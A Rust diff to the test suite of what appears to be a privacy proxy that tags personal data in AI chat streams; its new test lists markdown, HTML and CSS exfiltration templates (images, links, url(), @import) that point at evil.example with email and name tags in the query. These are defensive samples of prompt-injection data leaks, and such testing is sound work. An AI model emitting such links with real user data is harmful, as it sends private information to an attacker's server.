@@ -18,7 +18,7 @@
 //! Real values only ever land inside parsed JSON strings (re-serialised),
 //! JSON-escaped in streamed JSON fragments, or in plain text; JSON carried
 //! inside a string is restored at its own level. Tags inside URLs are never
-//! restored ([`crate::urlguard`]): a prompt-injected link or image cannot
+//! restored ([`parda_wire::urlguard`]): a prompt-injected link or image cannot
 //! carry a real value to another server.
 //!
 //! An event that leaves text held back (a possible tag prefix) is kept,
@@ -2607,13 +2607,33 @@ mod tests {
             if c[i] == ']' && i + 1 < n && c[i + 1] == '(' {
                 out.extend(dest(i + 2));
             }
-            if c[i] == ']' && i + 1 < n && c[i + 1] == ':' {
-                let start = c[..i]
-                    .iter()
-                    .rposition(|&ch| ch == '\n' || ch == '\r')
-                    .map_or(0, |p| p + 1);
-                if c[start..i].contains(&'[') {
-                    out.extend(dest(i + 2));
+            // Reference definitions (labels may span lines).
+            if c[i] == ']' && i + 1 < n && c[i + 1] == ':' && c[..i].contains(&'[') {
+                out.extend(dest(i + 2));
+            }
+            // CSS: `url(…)` to an unquoted `)`, `@import …` to an unquoted
+            // `;`.
+            let lower: String = c[i..]
+                .iter()
+                .take(7)
+                .collect::<String>()
+                .to_ascii_lowercase();
+            for (kw, end) in [("url(", ')'), ("@import", ';')] {
+                if lower.starts_with(kw) {
+                    let mut j = i + kw.chars().count();
+                    let mut quote = None;
+                    let mut d = String::new();
+                    while j < n {
+                        match quote {
+                            Some(q) if c[j] == q => quote = None,
+                            None if c[j] == '"' || c[j] == '\'' => quote = Some(c[j]),
+                            None if c[j] == end => break,
+                            _ => {}
+                        }
+                        d.push(c[j]);
+                        j += 1;
+                    }
+                    out.push(d);
                 }
             }
             let ahead: String = c[i..]
@@ -2641,15 +2661,17 @@ mod tests {
                     out.push(inner);
                 }
             }
-            // An HTML tag, tokenised like a browser: every attribute value.
+            // An HTML tag, tokenised like a browser (whitespace is TAB, LF,
+            // FF, CR, SPACE only): every attribute value.
+            let hws = |ch: char| matches!(ch, '\t' | '\n' | '\x0c' | '\r' | ' ');
             if i >= html_from && c[i] == '<' && i + 1 < n && c[i + 1].is_ascii_alphabetic() {
                 let mut j = i + 1;
-                while j < n && !c[j].is_ascii_whitespace() && c[j] != '>' && c[j] != '/' {
+                while j < n && !hws(c[j]) && c[j] != '>' && c[j] != '/' {
                     j += 1;
                 }
                 let mut values = Vec::new();
                 let closed = loop {
-                    while j < n && (c[j].is_ascii_whitespace() || c[j] == '/') {
+                    while j < n && (hws(c[j]) || c[j] == '/') {
                         j += 1;
                     }
                     if j >= n {
@@ -2658,15 +2680,15 @@ mod tests {
                     if c[j] == '>' {
                         break true;
                     }
-                    while j < n && !c[j].is_ascii_whitespace() && c[j] != '=' && c[j] != '>' {
+                    while j < n && !hws(c[j]) && c[j] != '=' && c[j] != '>' {
                         j += 1;
                     }
-                    while j < n && c[j].is_ascii_whitespace() {
+                    while j < n && hws(c[j]) {
                         j += 1;
                     }
                     if j < n && c[j] == '=' {
                         j += 1;
-                        while j < n && c[j].is_ascii_whitespace() {
+                        while j < n && hws(c[j]) {
                             j += 1;
                         }
                         if j < n && (c[j] == '"' || c[j] == '\'') {
@@ -2683,7 +2705,7 @@ mod tests {
                             j += 1;
                         } else {
                             let start = j;
-                            while j < n && !c[j].is_ascii_whitespace() && c[j] != '>' {
+                            while j < n && !hws(c[j]) && c[j] != '>' {
                                 j += 1;
                             }
                             values.push(c[start..j].iter().collect::<String>());
@@ -2703,6 +2725,121 @@ mod tests {
     fn the_oracle_finds_destinations() {
         let d = destinations("a ![x](<b\\>c d>) [e](f(g)h i) > [r]: j\r<http:k> www.l<m n=\"o p\"");
         assert_eq!(d, ["b\\>c d", "f(g)h", "j", "http:k", "www.l", "o p"]);
+    }
+
+    /// Characters at which a guard and a renderer could disagree about
+    /// where a URL ends.
+    fn boundary_chars() -> Vec<char> {
+        let mut v: Vec<char> = (0u32..=0x20).filter_map(char::from_u32).collect();
+        v.extend(['\u{7f}', '\u{85}', '\u{a0}', '\u{2028}', '\u{3000}']);
+        v
+    }
+
+    /// The syntax guard alone (no engine url-safe run): restores `pieces`
+    /// pushed one after another.
+    fn guard_only(e: &Engine, pieces: &[&str]) -> String {
+        let mut r = Guarded::new(e.stream_restorer(SCOPE));
+        let mut out = String::new();
+        for p in pieces {
+            out.push_str(&r.push(p));
+        }
+        out.push_str(&r.finish());
+        out
+    }
+
+    /// No real value inside any destination, URL or attribute value of
+    /// `out`.
+    fn assert_no_real_value_in_urls(out: &str, what: &str) {
+        for d in destinations(out) {
+            assert!(
+                !d.contains("Ravi Kumar") && !d.contains("ravi@example.com"),
+                "{what}: real value in {d:?} of {out:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn guarded_constructs_hold_at_every_boundary_char() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        // `{b}` is replaced by each boundary character. The last group are
+        // pointy and quoted contexts, where a space does not end the URL.
+        let templates = [
+            "![x](<//evil.example/?d={b}[EMAIL_1]>) ![y](<//e/{b}[NAME_1]>)",
+            "![x](//evil.example/?d={b}[EMAIL_1])",
+            "![x]({b}//evil.example/?d=[EMAIL_1])",
+            "[r]: //evil.example/?d={b}[EMAIL_1]\n\n![x][r]",
+            "[r{b}x]: <//evil.example/?d= {b}[NAME_1]>\n\n![a][r x]",
+            "[r]:{b}<//e/?d= [NAME_1]>",
+            "<http:evil.example/?d={b}[EMAIL_1]>",
+            "<img src=//evil.example/?d={b}[EMAIL_1]>",
+            "<img src=\"//evil.example/?d={b}[NAME_1]\">",
+            "<img src{b}={b}\"//e/ [NAME_1]\">",
+            "<img{b}src='//e/ [NAME_1]'>",
+            "<style>p{background:url(//e/?d={b}[EMAIL_1])}</style>",
+            "<style>p{background:url('//e/{b} [NAME_1]')}</style>",
+            "<style>@import{b}\"//evil.example/?{b} [NAME_1]\";</style>",
+            "www.evil.example/?d={b}[EMAIL_1]",
+            "![x](<https://evil.example/?d={b} [NAME_1]>)",
+            "![x](<https://evil.example/?d= {b}[NAME_1]>)",
+            "[r]: <//e/?d={b} [NAME_1]>\n\n![x][r]",
+            "[r]: <//e/?d= {b}[NAME_1]>\n\n![x][r]",
+            "<img src=\"https://evil.example/?d={b} [NAME_1]\">",
+            "<img src='https://evil.example/?d= {b}[NAME_1]'>",
+            "<p style=\"background:url('//e/?d={b} [NAME_1]')\">x</p>",
+            "<style>p{background:url('//evil.example/?d={b} [NAME_1]')}</style>",
+            "<style>p{background:url(\"//evil.example/?d= {b}[NAME_1]\")}</style>",
+            "<style>@import \"//evil.example/?d={b} [NAME_1]\";</style>",
+            "<style>@import url('//evil.example/?d= {b}[NAME_1]');</style>",
+        ];
+        for t in templates {
+            // Plain-text URLs are the engine's run rule, not the guard's.
+            let syntax = !t.starts_with("www.");
+            for b in boundary_chars() {
+                let text = t.replace("{b}", &b.to_string());
+                let label = format!("{t:?} with U+{:04X}", b as u32);
+                for n in [1, 3, text.len()] {
+                    let out = run(&e, "text/plain", text.as_bytes(), n);
+                    let out = String::from_utf8_lossy(&out).into_owned();
+                    assert_no_real_value_in_urls(&out, &format!("{label}, chunks of {n}"));
+                }
+                // The tag split from what precedes it right after the last
+                // space before it, and right after the boundary character.
+                let tag_at = text.rfind('[').unwrap();
+                let after_space = text[..tag_at].rfind(' ').map(|i| i + 1);
+                let after_b = t.find("{b}").map(|i| i + b.len_utf8());
+                for cut in after_space.into_iter().chain(after_b) {
+                    let pieces = [&text[..cut], &text[cut..]];
+                    let what = format!("{label}, cut at {cut}");
+                    let mut tr = for_content_type(&e, SCOPE, "text/plain");
+                    let mut out = tr.push(pieces[0].as_bytes()).to_vec();
+                    out.extend_from_slice(&tr.push(pieces[1].as_bytes()));
+                    out.extend_from_slice(&tr.finish());
+                    assert_no_real_value_in_urls(&String::from_utf8_lossy(&out), &what);
+                    let out = run(&e, "text/event-stream", &claude_stream(&pieces, true), 5);
+                    assert_no_real_value_in_urls(&claude_text(&out), &format!("{what} (sse)"));
+                    let out = run(&e, "text/event-stream", &chatgpt_stream(&pieces), 4);
+                    assert_no_real_value_in_urls(
+                        &chatgpt_text(&out),
+                        &format!("{what} (delta sse)"),
+                    );
+                    if syntax {
+                        assert_no_real_value_in_urls(
+                            &guard_only(&e, &pieces),
+                            &format!("{what} (guard alone)"),
+                        );
+                    }
+                }
+                if syntax {
+                    let chars: Vec<String> = text.chars().map(String::from).collect();
+                    let refs: Vec<&str> = chars.iter().map(String::as_str).collect();
+                    assert_no_real_value_in_urls(
+                        &guard_only(&e, &refs),
+                        &format!("{label} (guard alone, char by char)"),
+                    );
+                }
+            }
+        }
     }
 
     /// One tagged engine for every property-test case.
